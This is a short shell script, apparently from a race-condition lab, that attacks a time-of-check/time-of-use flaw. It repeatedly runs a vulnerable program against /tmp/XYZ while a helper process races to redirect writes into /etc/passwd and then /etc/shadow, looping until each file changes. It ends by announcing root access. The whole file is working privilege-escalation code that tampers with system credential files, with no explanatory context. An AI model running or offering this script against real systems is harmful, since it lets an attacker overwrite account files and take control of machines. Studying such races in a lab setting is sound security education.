#!/bin/sh


old=`ls -l /etc/passwd`
new=`ls -l /etc/passwd`
while [ "$old" = "$new" ]
do
    rm -f /tmp/XYZ
    touch /tmp/XYZ
    program < passtext & 
    race /etc/passwd
    new=`ls -l /etc/passwd`
    pkill race
done

pkill program

echo "The passwd file has been changed"

old=`ls -l /etc/shadow`
new=`ls -l /etc/shadow`
while [ "$old" = "$new" ]
do
    rm -f /tmp/XYZ
    touch /tmp/XYZ
    program < shadtext &
    race /etc/shadow
    new=`ls -l /etc/shadow`
    pkill race
done

pkill program

echo "STOP .... you should have root access now."
